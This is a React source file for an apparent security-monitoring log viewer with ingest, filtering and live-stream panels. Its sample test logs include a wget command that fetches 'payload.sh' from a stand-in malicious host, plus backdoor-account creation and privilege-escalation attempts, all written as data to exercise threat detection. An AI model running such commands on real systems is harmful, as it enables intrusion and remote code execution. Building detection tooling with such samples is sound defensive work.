import { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'
import axios from 'axios'

const pageVariants = { initial: { opacity: 0, y: 16 }, animate: { opacity: 1, y: 0, transition: { duration: 0.3 } } }

const LEVEL_COLORS = { critical: 'var(--danger)', error: '#ff8800', warning: 'var(--warning)', info: 'var(--info)', debug: '#4a5568' }

const SAMPLE_LOGS = [
    { source: 'syslog', message: 'Failed password for admin from 192.168.1.105 port 22 ssh2', ip: '192.168.1.105', user: 'admin', host: 'webserver-01' },
    { source: 'windows', message: 'An account failed to log on. Account Name: administrator', ip: '10.0.0.55', user: 'administrator', host: 'dc-01' },
    { source: 'linux', message: 'sudo: user www-data : command not allowed ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash', ip: '192.168.1.10', host: 'webserver-01' },
    { source: 'syslog', message: 'wget http://malicious.example.com/payload.sh -O /tmp/x.sh', ip: '192.168.1.10', host: 'webserver-01' },
    { source: 'custom', message: 'New user created: backdoor_user via useradd command', ip: '192.168.1.10', host: 'webserver-01' },
]

export default function LogViewer() {
    const [logs, setLogs] = useState([])
    const [total, setTotal] = useState(0)
    const [search, setSearch] = useState('')
    const [level, setLevel] = useState('')
    const [threatMin, setThreatMin] = useState(0)
    const [loading, setLoading] = useState(false)
    const [ingestText, setIngestText] = useState('')
    const [ingestSource, setIngestSource] = useState('syslog')
    const [ingestResult, setIngestResult] = useState(null)
    const streamRef = useRef(null)
    const ws = useRef(null)

    const fetchLogs = async () => {
        try {
            const params = { limit: 100, search, level, threat_min: threatMin }
            const r = await axios.get('/api/blue/logs', { params })
            setLogs(r.data.logs || [])
            setTotal(r.data.total || 0)
        } catch { }
    }

    useEffect(() => { fetchLogs() }, [search, level, threatMin])

    useEffect(() => {
        ws.current = new WebSocket(`ws://${window.location.hostname}:5000/ws`)
        ws.current.onmessage = (e) => {
            const d = JSON.parse(e.data)
            if (d.type === 'blue_log' && d.entry) {
                setLogs(prev => [d.entry, ...prev].slice(0, 200))
                if (streamRef.current) streamRef.current.scrollTop = 0
            }
        }
        return () => ws.current?.close()
    }, [])

    const ingestLog = async () => {
        if (!ingestText.trim()) return
        setLoading(true)
        try {
            const r = await axios.post('/api/blue/logs', { source: ingestSource, message: ingestText })
            setIngestResult(r.data)
            setIngestText('')
            fetchLogs()
        } catch (e) {
            setIngestResult({ error: e.message })
        }
        setLoading(false)
    }

    const ingestSample = async (sample) => {
        setLoading(true)
        try {
            await axios.post('/api/blue/logs', sample)
            fetchLogs()
        } catch { }
        setLoading(false)
    }

    const ingestBatch = async () => {
        setLoading(true)
        try {
            await axios.post('/api/blue/logs/batch', { logs: SAMPLE_LOGS })
            fetchLogs()
        } catch { }
        setLoading(false)
    }

    return (
        <motion.div className="page-container" variants={pageVariants} initial="initial" animate="animate">
            <div className="page-title">📋 Log Viewer</div>
            <div className="page-subtitle">Ingest and analyze security logs in real-time</div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5rem', marginBottom: '1.5rem' }}>
                {/* Ingest Panel */}
                <div className="card">
                    <div className="section-title">➕ Ingest Log</div>
                    <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '0.75rem' }}>
                        {['syslog', 'windows', 'linux', 'custom'].map(s => (
                            <button key={s} onClick={() => setIngestSource(s)}
                                style={{
                                    padding: '0.3rem 0.7rem', borderRadius: 6, border: '1px solid', cursor: 'pointer', fontSize: '0.75rem', fontWeight: 600,
                                    background: ingestSource === s ? 'var(--cyan)' : 'transparent',
                                    color: ingestSource === s ? 'var(--bg-primary)' : 'var(--text-secondary)',
                                    borderColor: ingestSource === s ? 'var(--cyan)' : 'var(--border)'
                                }}>
                                {s}
                            </button>
                        ))}
                    </div>
                    <textarea
                        className="input" rows={3} placeholder="Paste a log line here..."
                        value={ingestText} onChange={e => setIngestText(e.target.value)}
                        style={{ resize: 'vertical', fontFamily: 'var(--font-mono)', fontSize: '0.8rem', marginBottom: '0.75rem' }}
                    />
                    <div style={{ display: 'flex', gap: '0.5rem' }}>
                        <button className="btn btn-primary" onClick={ingestLog} disabled={loading}>
                            {loading ? 'Analyzing...' : '🔍 Analyze & Ingest'}
                        </button>
                        <button className="btn btn-ghost" onClick={ingestBatch} disabled={loading}>
                            📦 Load Sample Logs
                        </button>
                    </div>
                    {ingestResult && (
                        <div style={{ marginTop: '0.75rem', padding: '0.75rem', background: 'var(--bg-secondary)', borderRadius: 8, fontFamily: 'var(--font-mono)', fontSize: '0.78rem' }}>
                            {ingestResult.error ? (
                                <span style={{ color: 'var(--danger)' }}>Error: {ingestResult.error}</span>
                            ) : (
                                <>
                                    <div>Threat Score: <span style={{ color: ingestResult.threat_score > 50 ? 'var(--danger)' : 'var(--success)' }}>{ingestResult.threat_score}/100</span></div>
                                    <div>Flags: {ingestResult.flags?.join(', ') || 'None'}</div>
                                    {ingestResult.incident && <div style={{ color: '#ff8800' }}>⚠️ Incident created: {ingestResult.incident.title}</div>}
                                </>
                            )}
                        </div>
                    )}
                </div>

                {/* Sample Logs */}
                <div className="card">
                    <div className="section-title">🧪 Quick Test Logs</div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                        {SAMPLE_LOGS.map((s, i) => (
                            <button key={i} onClick={() => ingestSample(s)} disabled={loading}
                                style={{
                                    textAlign: 'left', padding: '0.5rem 0.75rem', background: 'var(--bg-secondary)', border: '1px solid var(--border)',
                                    borderRadius: 6, cursor: 'pointer', color: 'var(--text-secondary)', fontSize: '0.78rem', fontFamily: 'var(--font-mono)'
                                }}>
                                {s.message.slice(0, 70)}...
                            </button>
                        ))}
                    </div>
                </div>
            </div>

            {/* Filters */}
            <div className="card" style={{ marginBottom: '1rem' }}>
                <div style={{ display: 'flex', gap: '1rem', alignItems: 'center', flexWrap: 'wrap' }}>
                    <input className="input" placeholder="Search logs..." value={search} onChange={e => setSearch(e.target.value)} style={{ flex: 1, minWidth: 200 }} />
                    <select className="input" value={level} onChange={e => setLevel(e.target.value)} style={{ width: 140 }}>
                        <option value="">All Levels</option>
                        {['critical', 'error', 'warning', 'info', 'debug'].map(l => <option key={l} value={l}>{l}</option>)}
                    </select>
                    <select className="input" value={threatMin} onChange={e => setThreatMin(e.target.value)} style={{ width: 160 }}>
                        <option value={0}>All Threat Scores</option>
                        <option value={30}>Score ≥ 30</option>
                        <option value={50}>Score ≥ 50</option>
                        <option value={70}>Score ≥ 70</option>
                    </select>
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{total} logs</span>
                </div>
            </div>

            {/* Log Stream */}
            <div className="card">
                <div className="section-title">📡 Live Log Stream</div>
                <div className="log-stream" ref={streamRef}>
                    {logs.length === 0 ? (
                        <div style={{ color: '#4a5568', padding: '1rem' }}>No logs yet. Ingest some logs above or click "Load Sample Logs".</div>
                    ) : logs.map((log, i) => (
                        <div key={log._id || i} className="log-line">
                            <span className="log-ts">{new Date(log.timestamp).toLocaleTimeString()}</span>
                            <span className="log-lvl" style={{ color: LEVEL_COLORS[log.level] || '#4a5568', fontWeight: 700 }}>[{log.level?.toUpperCase()}]</span>
                            {log.threat_score > 0 && <span style={{ color: log.threat_score > 50 ? 'var(--danger)' : '#ff8800', fontSize: '0.75rem' }}>{log.threat_score}</span>}
                            <span className="log-msg">{log.message}</span>
                        </div>
                    ))}
                </div>
            </div>
        </motion.div>
    )
}
